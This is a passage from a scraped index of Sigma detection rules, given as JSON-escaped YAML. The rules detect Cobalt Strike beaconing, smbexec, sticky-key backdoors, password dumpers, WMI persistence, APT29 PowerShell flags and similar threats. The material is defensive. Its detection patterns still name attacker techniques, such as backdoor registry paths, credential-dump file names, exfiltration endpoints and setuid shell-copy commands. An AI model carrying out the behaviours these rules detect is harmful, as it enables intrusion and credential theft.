https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/ Raw rule (edit) title: Cobalt Strike DNS Beaconing id: 2975af79-28c4-4d2f-a951-9095f229df29 status: experimental description: Detects suspicious DNS queries known from Cobalt Strike beacons author: Florian Roth date: 2018/05/10 modified: 2021/03/24 references: - https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns - https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/ logsource: category: dns detection: selection1: query|startswith: - \u0026#39;aaa.stage.\u0026#39; - \u0026#39;post.1\u0026#39; selection2: query|contains: \u0026#39;.stage.123456.\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.command_and_control - attack.t1071.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_mal_dns_cobaltstrike.yml/","tags":["attack.command_and_control","attack.t1071.004"],"title":"Cobalt Strike DNS Beaconing"},{"categories":null,"contents":"Detects the use of smbexec.py tool by detecting a specific service installation\nKnown false-positives Penetration Test Unknown References https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ Raw rule (edit) title: smbexec.py Service Installation id: 52a85084-6989-40c3-8f32-091e12e13f09 status: test description: Detects the use of smbexec.py tool by detecting a specific service installation author: Omer Faruk Celik references: - https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ date: 2018/03/20 modified: 2021/11/30 logsource: product: windows service: system detection: service_installation: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ServiceName: \u0026#39;BTOBTO\u0026#39; ServiceFileName|endswith: \u0026#39;\\execute.bat\u0026#39; condition: service_installation fields: - ServiceName - ServiceFileName falsepositives: - Penetration Test - Unknown level: critical tags: - attack.lateral_movement - attack.execution - attack.t1021.002 - attack.t1569.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_hack_smbexec.yml/","tags":["attack.lateral_movement","attack.execution","attack.t1021.002","attack.t1569.002"],"title":"smbexec.py Service Installation"},{"categories":null,"contents":"Detects NetNTLM downgrade attack\nKnown false-positives Unknown References https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks Raw rule (edit) title: NetNTLM Downgrade Attack id: d67572a0-e2ec-45d6-b8db-c100d14b8ef2 description: Detects NetNTLM downgrade attack status: experimental references: - https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks author: Florian Roth, wagga date: 2018/03/20 modified: 2021/09/21 tags: - attack.defense_evasion - attack.t1562.001 - attack.t1112 logsource: product: windows category: registry_event detection: selection: TargetObject|contains|all: - \u0026#39;SYSTEM\\\u0026#39; - \u0026#39;ControlSet\u0026#39; - \u0026#39;\\Control\\Lsa\u0026#39; TargetObject|endswith: - \u0026#39;\\lmcompatibilitylevel\u0026#39; - \u0026#39;\\NtlmMinClientSec\u0026#39; - \u0026#39;\\RestrictSendingNTLMTraffic\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_net_ntlm_downgrade.yml/","tags":["attack.defense_evasion","attack.t1562.001","attack.t1112"],"title":"NetNTLM Downgrade Attack"},{"categories":null,"contents":"Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM\nKnown false-positives Unknown Raw rule (edit) title: Taskmgr as LOCAL_SYSTEM id: 9fff585c-c33e-4a86-b3cd-39312079a65f status: experimental description: Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM tags: - attack.defense_evasion - attack.t1036 author: Florian Roth date: 2018/03/18 modified: 2021/08/26 logsource: category: process_creation product: windows detection: selection: User|startswith: - \u0026#39;NT AUTHORITY\\SYSTEM\u0026#39; - \u0026#39;AUTORITE NT\\Sys\u0026#39; # French language settings Image|endswith: \u0026#39;\\taskmgr.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_taskmgr_localsystem.yml/","tags":["attack.defense_evasion","attack.t1036"],"title":"Taskmgr as LOCAL_SYSTEM"},{"categories":null,"contents":"Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen\nKnown false-positives Unlikely References https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/ Raw rule (edit) title: Sticky Key Like Backdoor Usage id: baca5663-583c-45f9-b5dc-ea96a22ce542 description: Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen status: experimental references: - https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/ author: Florian Roth, @twjackomo, Jonhnathan Ribeiro, oscd.community date: 2018/03/15 modified: 2021/09/12 logsource: category: registry_event product: windows detection: selection_registry: TargetObject|endswith: - \u0026#39;\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger\u0026#39; - \u0026#39;\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\\Debugger\u0026#39; - \u0026#39;\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\Debugger\u0026#39; - \u0026#39;\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify.exe\\Debugger\u0026#39; - \u0026#39;\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator.exe\\Debugger\u0026#39; - \u0026#39;\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe\\Debugger\u0026#39; condition: selection_registry falsepositives: - Unlikely level: critical tags: - attack.privilege_escalation - attack.persistence - attack.t1546.008 - car.2014-11-003 - car.2014-11-008 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_stickykey_like_backdoor.yml/","tags":["attack.privilege_escalation","attack.persistence","attack.t1546.008","car.2014-11-003","car.2014-11-008"],"title":"Sticky Key Like Backdoor Usage"},{"categories":null,"contents":"Detects the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group\nKnown false-positives Unknown References https://securelist.com/apt-slingshot/84312/ Raw rule (edit) title: Defrag Deactivation id: 958d81aa-8566-4cea-a565-59ccd4df27b0 description: Detects the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group status: experimental author: Florian Roth, Bartlomiej Czyz (@bczyz1) date: 2019/03/04 modified: 2021/09/19 references: - https://securelist.com/apt-slingshot/84312/ tags: - attack.persistence - attack.t1053.005 - attack.s0111 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\schtasks.exe\u0026#39; CommandLine|contains: - \u0026#39;/delete\u0026#39; - \u0026#39;/change\u0026#39; CommandLine|contains|all: - \u0026#39;/TN\u0026#39; - \u0026#39;\\Microsoft\\Windows\\Defrag\\ScheduledDefrag\u0026#39; condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_slingshot.yml/","tags":["attack.persistence","attack.t1053.005","attack.s0111"],"title":"Defrag Deactivation"},{"categories":null,"contents":"Detects Winword starting uncommon sub process MicroScMgmt.exe as used in exploits for CVE-2015-1641\nKnown false-positives Unknown References https://www.virustotal.com/en/file/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8/analysis/ https://www.hybrid-analysis.com/sample/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8?environmentId=100 Raw rule (edit) title: Exploit for CVE-2015-1641 id: 7993792c-5ce2-4475-a3db-a3a5539827ef status: stable description: Detects Winword starting uncommon sub process MicroScMgmt.exe as used in exploits for CVE-2015-1641 author: Florian Roth references: - https://www.virustotal.com/en/file/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8/analysis/ - https://www.hybrid-analysis.com/sample/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8?environmentId=100 date: 2018/02/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\WINWORD.EXE\u0026#39; Image|endswith: \u0026#39;\\MicroScMgmt.exe\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1036.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_cve_2015_1641.yml/","tags":["attack.defense_evasion","attack.t1036.005"],"title":"Exploit for CVE-2015-1641"},{"categories":null,"contents":"Detects suspicious DNS error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts\nKnown false-positives Unknown References https://github.com/ossec/ossec-hids/blob/master/etc/rules/named_rules.xml Raw rule (edit) title: Suspicious Named Error id: c8e35e96-19ce-4f16-aeb6-fd5588dc5365 status: test description: Detects suspicious DNS error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts author: Florian Roth references: - https://github.com/ossec/ossec-hids/blob/master/etc/rules/named_rules.xml date: 2018/02/20 modified: 2021/11/27 logsource: product: linux service: syslog detection: keywords: - \u0026#39;* dropping source port zero packet from *\u0026#39; - \u0026#39;* denied AXFR from *\u0026#39; - \u0026#39;* exiting (due to fatal error)*\u0026#39; condition: keywords falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/other/lnx_susp_named.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Suspicious Named Error"},{"categories":null,"contents":"Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz\u0026rsquo;s sekurlsa::pth module.\nKnown false-positives Runas command-line tool using /netonly parameter References https://cyberwardog.blogspot.de/2017/04/chronicles-of-threat-hunter-hunting-for.html Raw rule (edit) title: Successful Overpass the Hash Attempt id: 192a0330-c20b-4356-90b6-7b7049ae0b87 status: test description: Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz\u0026#39;s sekurlsa::pth module. author: Roberto Rodriguez (source), Dominik Schaudel (rule) references: - https://cyberwardog.blogspot.de/2017/04/chronicles-of-threat-hunter-hunting-for.html date: 2018/02/12 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4624 LogonType: 9 LogonProcessName: seclogo AuthenticationPackageName: Negotiate condition: selection falsepositives: - Runas command-line tool using /netonly parameter level: high tags: - attack.lateral_movement - attack.s0002 - attack.t1550.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_overpass_the_hash.yml/","tags":["attack.lateral_movement","attack.s0002","attack.t1550.002"],"title":"Successful Overpass the Hash Attempt"},{"categories":null,"contents":"Detects a dump file written by QuarksPwDump password dumper\nKnown false-positives Unknown References https://jpcertcc.github.io/ToolAnalysisResultSheet/details/QuarksPWDump.htm Raw rule (edit) title: QuarksPwDump Dump File id: 847def9e-924d-4e90-b7c4-5f581395a2b4 status: test description: Detects a dump file written by QuarksPwDump password dumper author: Florian Roth references: - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/QuarksPWDump.htm date: 2018/02/10 modified: 2021/11/27 logsource: category: file_event product: windows detection: selection: # Sysmon: File Creation (ID 11) TargetFilename|contains|all: - \u0026#39;\\AppData\\Local\\Temp\\SAM-\u0026#39; - \u0026#39;.dmp\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1003.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_quarkspw_filedump.yml/","tags":["attack.credential_access","attack.t1003.002"],"title":"QuarksPwDump Dump File"},{"categories":null,"contents":"Detects Elise backdoor acitivty as used by APT32\nKnown false-positives Unknown References https://community.rsa.com/community/products/netwitness/blog/2018/02/13/lotus-blossom-continues-asean-targeting Raw rule (edit) title: Elise Backdoor id: e507feb7-5f73-4ef6-a970-91bb6f6d744f status: test description: Detects Elise backdoor acitivty as used by APT32 author: Florian Roth references: - https://community.rsa.com/community/products/netwitness/blog/2018/02/13/lotus-blossom-continues-asean-targeting date: 2018/01/31 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image: \u0026#39;C:\\Windows\\SysWOW64\\cmd.exe\u0026#39; CommandLine|contains: \u0026#39;\\Windows\\Caches\\NavShExt.dll \u0026#39; selection2: CommandLine|endswith: \u0026#39;\\AppData\\Roaming\\MICROS~1\\Windows\\Caches\\NavShExt.dll,Setting\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.g0030 - attack.g0050 - attack.s0081 - attack.execution - attack.t1059.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_elise.yml/","tags":["attack.g0030","attack.g0050","attack.s0081","attack.execution","attack.t1059.003"],"title":"Elise Backdoor"},{"categories":null,"contents":"Detects a specific tool and export used by EquationGroup\nKnown false-positives Unknown References https://github.com/adamcaudill/EquationGroupLeak/search?utf8=%E2%9C%93\u0026amp;q=dll_u\u0026amp;type= https://securelist.com/apt-slingshot/84312/ https://twitter.com/cyb3rops/status/972186477512839170 Raw rule (edit) title: Equation Group DLL_U Load id: d465d1d8-27a2-4cca-9621-a800f37cf72e status: stable description: Detects a specific tool and export used by EquationGroup author: Florian Roth references: - https://github.com/adamcaudill/EquationGroupLeak/search?utf8=%E2%9C%93\u0026amp;q=dll_u\u0026amp;type= - https://securelist.com/apt-slingshot/84312/ - https://twitter.com/cyb3rops/status/972186477512839170 date: 2019/03/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\rundll32.exe\u0026#39; CommandLine|endswith: \u0026#39;,dll_u\u0026#39; selection2: CommandLine|contains: \u0026#39; -export dll_u \u0026#39; condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.g0020 - attack.defense_evasion - attack.t1218.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_equationgroup_dll_u_load.yml/","tags":["attack.g0020","attack.defense_evasion","attack.t1218.011"],"title":"Equation Group DLL_U Load"},{"categories":null,"contents":"Detects program executions in suspicious non-program folders related to malware or hacking activity\nKnown false-positives Admin activity (especially in /tmp folders) Crazy web applications References Internal Research Raw rule (edit) title: Program Executions in Suspicious Folders id: a39d7fa7-3fbd-4dc2-97e1-d87f546b1bbc status: test description: Detects program executions in suspicious non-program folders related to malware or hacking activity author: Florian Roth references: - Internal Research date: 2018/01/23 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: \u0026#39;SYSCALL\u0026#39; exe|startswith: # Temporary folder - \u0026#39;/tmp/\u0026#39; # Web server - \u0026#39;/var/www/\u0026#39; # Standard - \u0026#39;/home/*/public_html/\u0026#39; # Per-user - \u0026#39;/usr/local/apache2/\u0026#39; # Classical Apache - \u0026#39;/usr/local/httpd/\u0026#39; # Old SuSE Linux 6.* Apache - \u0026#39;/var/apache/\u0026#39; # Solaris Apache - \u0026#39;/srv/www/\u0026#39; # SuSE Linux 9.* - \u0026#39;/home/httpd/html/\u0026#39; # Redhat 6 or older Apache - \u0026#39;/srv/http/\u0026#39; # ArchLinux standard - \u0026#39;/usr/share/nginx/html/\u0026#39; # ArchLinux nginx # Data dirs of typically exploited services (incomplete list) - \u0026#39;/var/lib/pgsql/data/\u0026#39; - \u0026#39;/usr/local/mysql/data/\u0026#39; - \u0026#39;/var/lib/mysql/\u0026#39; - \u0026#39;/var/vsftpd/\u0026#39; - \u0026#39;/etc/bind/\u0026#39; - \u0026#39;/var/named/\u0026#39; condition: selection falsepositives: - Admin activity (especially in /tmp folders) - Crazy web applications level: medium tags: - attack.t1587 - attack.t1584 - attack.resource_development ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_susp_exe_folders.yml/","tags":["attack.t1587","attack.t1584","attack.resource_development"],"title":"Program Executions in Suspicious Folders"},{"categories":null,"contents":"Detects relevant commands often related to malware or hacking activity\nKnown false-positives Admin activity References Internal Research - mostly derived from exploit code including code in MSF Raw rule (edit) title: Suspicious Commands Linux id: 1543ae20-cbdf-4ec1-8d12-7664d667a825 status: test description: Detects relevant commands often related to malware or hacking activity author: Florian Roth references: - Internal Research - mostly derived from exploit code including code in MSF date: 2017/12/12 modified: 2021/11/27 logsource: product: linux service: auditd detection: cmd1: type: \u0026#39;EXECVE\u0026#39; a0: \u0026#39;chmod\u0026#39; a1: \u0026#39;777\u0026#39; cmd2: type: \u0026#39;EXECVE\u0026#39; a0: \u0026#39;chmod\u0026#39; a1: \u0026#39;u+s\u0026#39; cmd3: type: \u0026#39;EXECVE\u0026#39; a0: \u0026#39;cp\u0026#39; a1: \u0026#39;/bin/ksh\u0026#39; cmd4: type: \u0026#39;EXECVE\u0026#39; a0: \u0026#39;cp\u0026#39; a1: \u0026#39;/bin/sh\u0026#39; condition: 1 of cmd* falsepositives: - Admin activity level: medium tags: - attack.execution - attack.t1059.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_susp_cmds.yml/","tags":["attack.execution","attack.t1059.004"],"title":"Suspicious Commands Linux"},{"categories":null,"contents":"Detects SQL error messages that indicate probing for an injection attack\nKnown false-positives Application bugs References http://www.sqlinjection.net/errors Raw rule (edit) title: Suspicious SQL Error Messages id: 8a670c6d-7189-4b1c-8017-a417ca84a086 status: test description: Detects SQL error messages that indicate probing for an injection attack author: Bjoern Kimminich references: - http://www.sqlinjection.net/errors date: 2017/11/27 modified: 2021/11/27 logsource: category: application product: sql detection: keywords: # Oracle - quoted string not properly terminated # MySQL - You have an error in your SQL syntax # SQL Server - Unclosed quotation mark # SQLite - \u0026#39;near \u0026#34;*\u0026#34;: syntax error\u0026#39; - SELECTs to the left and right of UNION do not have the same number of result columns condition: keywords falsepositives: - Application bugs level: high tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/sql/app_sqlinjection_errors.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Suspicious SQL Error Messages"},{"categories":null,"contents":"Detects scenarios where system auditing (ie: windows event log auditing) is disabled. This may be used in a scenario where an entity would want to bypass local logging to evade detection when windows event logging is enabled and reviewed. Also, it is recommended to turn off \u0026ldquo;Local Group Policy Object Processing\u0026rdquo; via GPO, which will make sure that Active Directory GPOs take precedence over local/edited computer policies via something such as \u0026ldquo;gpedit.msc\u0026rdquo;. Please note, that disabling \u0026ldquo;Local Group Policy Object Processing\u0026rdquo; may cause an issue in scenarios of one off specific GPO modifications \u0026ndash; however it is recommended to perform these modifications in Active Directory anyways.\nKnown false-positives Unknown References https://bit.ly/WinLogsZero2Hero Raw rule (edit) title: Disabling Windows Event Auditing id: 69aeb277-f15f-4d2d-b32a-55e883609563 status: test description: \u0026#39;Detects scenarios where system auditing (ie: windows event log auditing) is disabled. This may be used in a scenario where an entity would want to bypass local logging to evade detection when windows event logging is enabled and reviewed. Also, it is recommended to turn off \u0026#34;Local Group Policy Object Processing\u0026#34; via GPO, which will make sure that Active Directory GPOs take precedence over local/edited computer policies via something such as \u0026#34;gpedit.msc\u0026#34;. Please note, that disabling \u0026#34;Local Group Policy Object Processing\u0026#34; may cause an issue in scenarios of one off specific GPO modifications -- however it is recommended to perform these modifications in Active Directory anyways.\u0026#39; author: \u0026#39;@neu5ron\u0026#39; references: - https://bit.ly/WinLogsZero2Hero date: 2017/11/19 modified: 2021/11/27 logsource: product: windows service: security definition: \u0026#39;Requirements: Audit Policy : Computer Management \u0026gt; Audit Policy Configuration, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authorization Policy Change\u0026#39; detection: selection: EventID: 4719 AuditPolicyChanges|contains: - \u0026#39;%%8448\u0026#39; # This is \u0026#34;Success removed\u0026#34; - \u0026#39;%%8450\u0026#39; # This is \u0026#34;Failure removed\u0026#34; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_disable_event_logging.yml/","tags":["attack.defense_evasion","attack.t1562.002"],"title":"Disabling Windows Event Auditing"},{"categories":null,"contents":"Detect remote login by Administrator user (depending on internal pattern).\nKnown false-positives Legitimate administrative activity. References https://car.mitre.org/wiki/CAR-2016-04-005 Raw rule (edit) title: Admin User Remote Logon id: 0f63e1ef-1eb9-4226-9d54-8927ca08520a description: Detect remote login by Administrator user (depending on internal pattern). references: - https://car.mitre.org/wiki/CAR-2016-04-005 tags: - attack.lateral_movement - attack.t1078.001 - attack.t1078.002 - attack.t1078.003 - car.2016-04-005 status: experimental author: juju4 date: 2017/10/29 modified: 2021/07/07 logsource: product: windows service: security definition: \u0026#39;Requirements: Identifiable administrators usernames (pattern or special unique character. ex: \u0026#34;Admin-*\u0026#34;), internal policy mandating use only as secondary account\u0026#39; detection: selection: EventID: 4624 LogonType: 10 AuthenticationPackageName: Negotiate TargetUserName|startswith: \u0026#39;Admin\u0026#39; condition: selection falsepositives: - Legitimate administrative activity. level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_admin_rdp_login.yml/","tags":["attack.lateral_movement","attack.t1078.001","attack.t1078.002","attack.t1078.003","car.2016-04-005"],"title":"Admin User Remote Logon"},{"categories":null,"contents":"Detects renamed SysInternals tool execution with a binary named ps.exe as used by Dragonfly APT group and documented in TA17-293A report\nKnown false-positives Renamed SysInternals tool References https://www.us-cert.gov/ncas/alerts/TA17-293A Raw rule (edit) title: Ps.exe Renamed SysInternals Tool id: 18da1007-3f26-470f-875d-f77faf1cab31 status: test description: Detects renamed SysInternals tool execution with a binary named ps.exe as used by Dragonfly APT group and documented in TA17-293A report author: Florian Roth references: - https://www.us-cert.gov/ncas/alerts/TA17-293A date: 2017/10/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine: \u0026#39;ps.exe -accepteula\u0026#39; condition: selection falsepositives: - Renamed SysInternals tool level: high tags: - attack.defense_evasion - attack.g0035 - attack.t1036.003 - car.2013-05-009 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_ta17_293a_ps.yml/","tags":["attack.defense_evasion","attack.g0035","attack.t1036.003","car.2013-05-009"],"title":"Ps.exe Renamed SysInternals Tool"},{"categories":null,"contents":"Detects Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759\nKnown false-positives Unknown References https://www.hybrid-analysis.com/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100 https://www.reverse.it/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100 Raw rule (edit) title: Exploit for CVE-2017-8759 id: fdd84c68-a1f6-47c9-9477-920584f94905 status: test description: Detects Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759 author: Florian Roth references: - https://www.hybrid-analysis.com/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100 - https://www.reverse.it/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100 date: 2017/09/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\WINWORD.EXE\u0026#39; Image|endswith: \u0026#39;\\csc.exe\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1203 - attack.t1204.002 - attack.initial_access - attack.t1566.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_cve_2017_8759.yml/","tags":["attack.execution","attack.t1203","attack.t1204.002","attack.initial_access","attack.t1566.001"],"title":"Exploit for CVE-2017-8759"},{"categories":null,"contents":"Detects an executable in the Windows folder accessing github.com\nKnown false-positives Unknown @subTee in your network References https://twitter.com/M_haggis/status/900741347035889665 https://twitter.com/M_haggis/status/1032799638213066752 https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/exfil/Invoke-ExfilDataToGitHub.ps1 Raw rule (edit) title: Microsoft Binary Github Communication id: 635dbb88-67b3-4b41-9ea5-a3af2dd88153 status: test description: Detects an executable in the Windows folder accessing github.com author: Michael Haag (idea), Florian Roth (rule) references: - https://twitter.com/M_haggis/status/900741347035889665 - https://twitter.com/M_haggis/status/1032799638213066752 - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/exfil/Invoke-ExfilDataToGitHub.ps1 date: 2017/08/24 modified: 2021/11/27 logsource: category: network_connection product: windows detection: selection: Initiated: \u0026#39;true\u0026#39; DestinationHostname|endswith: - \u0026#39;.github.com\u0026#39; - \u0026#39;.githubusercontent.com\u0026#39; Image|startswith: \u0026#39;C:\\Windows\\\u0026#39; condition: selection falsepositives: - \u0026#39;Unknown\u0026#39; - \u0026#39;@subTee in your network\u0026#39; level: high tags: - attack.lateral_movement - attack.t1105 - attack.exfiltration - attack.t1567.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_binary_github_com.yml/","tags":["attack.lateral_movement","attack.t1105","attack.exfiltration","attack.t1567.001"],"title":"Microsoft Binary Github Communication"},{"categories":null,"contents":"Detects an executable in the Windows folder accessing suspicious domains\nKnown false-positives Unknown References https://twitter.com/M_haggis/status/900741347035889665 https://twitter.com/M_haggis/status/1032799638213066752 Raw rule (edit) title: Microsoft Binary Suspicious Communication Endpoint id: e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97 status: test description: Detects an executable in the Windows folder accessing suspicious domains author: Florian Roth references: - https://twitter.com/M_haggis/status/900741347035889665 - https://twitter.com/M_haggis/status/1032799638213066752 date: 2018/08/30 modified: 2021/11/27 logsource: category: network_connection product: windows detection: selection: Initiated: \u0026#39;true\u0026#39; DestinationHostname|endswith: - \u0026#39;dl.dropboxusercontent.com\u0026#39; - \u0026#39;.pastebin.com\u0026#39; - \u0026#39;.githubusercontent.com\u0026#39; # includes both gists and github repositories Image|startswith: \u0026#39;C:\\Windows\\\u0026#39; condition: selection falsepositives: - \u0026#39;Unknown\u0026#39; level: high tags: - attack.lateral_movement - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_binary_susp_com.yml/","tags":["attack.lateral_movement","attack.t1105"],"title":"Microsoft Binary Suspicious Communication Endpoint"},{"categories":null,"contents":"Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs.\nKnown false-positives Unknown (data set is too small; further testing needed) References https://twitter.com/mattifestation/status/899646620148539397 https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/ Raw rule (edit) title: WMI Persistence id: 0b7889b4-5577-4521-a60a-3376ee7f9f7b status: experimental description: Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs. author: Florian Roth, Gleb Sukhodolskiy, Timur Zinniatullin oscd.community date: 2017/08/22 modified: 2022/02/10 references: - https://twitter.com/mattifestation/status/899646620148539397 - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/ tags: - attack.persistence - attack.privilege_escalation - attack.t1546.003 logsource: product: windows service: wmi #native windows detection definition: \u0026#39;WMI Namespaces Auditing and SACL should be configured, EventID 5861 and 5859 detection requires Windows 10, 2012 and higher\u0026#39; detection: wmi_filter_to_consumer_binding: EventID: 5861 consumer_keywords: - \u0026#39;ActiveScriptEventConsumer\u0026#39; - \u0026#39;CommandLineEventConsumer\u0026#39; - \u0026#39;CommandLineTemplate\u0026#39; # - \u0026#39;Binding EventFilter\u0026#39; # too many false positive with HP Health Driver wmi_filter_registration: EventID: 5859 filter_scmevent: Provider: \u0026#39;SCM Event Provider\u0026#39; Query: \u0026#39;select * from MSFT_SCMEventLogEvent\u0026#39; User: \u0026#39;S-1-5-32-544\u0026#39; PossibleCause: \u0026#39;Permanent\u0026#39; condition: ( (wmi_filter_to_consumer_binding and consumer_keywords) or (wmi_filter_registration) ) and not filter_scmevent falsepositives: - Unknown (data set is too small; further testing needed) level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/wmi/win_wmi_persistence.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1546.003"],"title":"WMI Persistence"},{"categories":null,"contents":"This method detects a suspicious PowerShell command line combination as used by APT29 in a campaign against U.S. think tanks.\nKnown false-positives unknown References https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/ https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html Raw rule (edit) title: APT29 id: 033fe7d6-66d1-4240-ac6b-28908009c71f status: test description: This method detects a suspicious PowerShell command line combination as used by APT29 in a campaign against U.S. think tanks. author: Florian Roth references: - https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/ - https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html date: 2018/12/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;-noni\u0026#39; - \u0026#39;-ep\u0026#39; - \u0026#39;bypass\u0026#39; - \u0026#39;$\u0026#39; condition: selection falsepositives: - unknown level: critical tags: - attack.execution - attack.g0016 - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_apt29_thinktanks.yml/","tags":["attack.execution","attack.g0016","attack.t1059.001"],"title":"APT29"},{"categories":null,"contents":"Generic 